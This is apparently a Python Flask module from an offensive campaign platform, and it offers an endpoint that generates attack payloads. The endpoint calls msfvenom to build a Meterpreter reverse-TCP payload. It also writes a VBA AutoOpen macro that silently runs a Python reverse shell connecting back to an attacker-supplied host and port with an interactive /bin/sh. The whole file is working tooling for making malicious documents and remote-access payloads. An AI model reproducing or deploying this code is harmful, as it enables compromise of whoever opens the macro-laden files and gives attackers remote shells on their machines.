from flask import Blueprint, request, jsonify, current_app
from database.models import Campaign
from database import db
import subprocess
import os
import uuid
import tempfile
import stat

payload_bp = Blueprint('payload', __name__, url_prefix='/payload')

@payload_bp.route('/generate', methods=['POST'])
def generate_payload():
    data = request.json
    if not all(k in data for k in ['campaign_id', 'payload_type', 'lhost', 'lport']):
        return jsonify({'error': 'Missing required parameters'}), 400

    try:
        campaign = Campaign.query.get(data['campaign_id'])
        if not campaign:
            return jsonify({'error': 'Campaign not found'}), 404

        payload_dir = os.path.join(current_app.config['PAYLOAD_DIR'], str(campaign.id))
        os.makedirs(payload_dir, exist_ok=True)

        payload_file = os.path.join(payload_dir, f"payload_{uuid.uuid4().hex[:8]}")

        if data['payload_type'] == 'reverse_shell':
            # Generate reverse shell payload using msfvenom
            cmd = [
                'msfvenom',
                '-p', 'python/meterpreter/reverse_tcp',
                f"LHOST={data['lhost']}",
                f"LPORT={data['lport']}",
                '-f', 'raw',
                '-o', payload_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"msfvenom failed: {result.stderr}")

            # Make executable
            os.chmod(payload_file, stat.S_IRWXU)

        elif data['payload_type'] == 'macro':
            # Generate VBA macro payload
            macro_code = f"""
            Sub AutoOpen()
                Dim payload As String
                payload = "python -c 'import socket,subprocess,os;"
                payload = payload & "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                payload = payload & "s.connect((""{data['lhost']}"",{data['lport']}));"
                payload = payload & "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                payload = payload & "p=subprocess.call([""/bin/sh"",""-i""]);'"
                Shell payload, vbHide
            End Sub
            """
            with open(f"{payload_file}.vba", 'w') as f:
                f.write(macro_code)

        else:
            return jsonify({'error': 'Invalid payload type'}), 400

        return jsonify({
            'success': True,
            'payload_path': payload_file,
            'payload_type': data['payload_type']
        })

    except Exception as e:
        current_app.logger.error(f"Payload generation failed: {str(e)}")
        return jsonify({'error': str(e)}), 500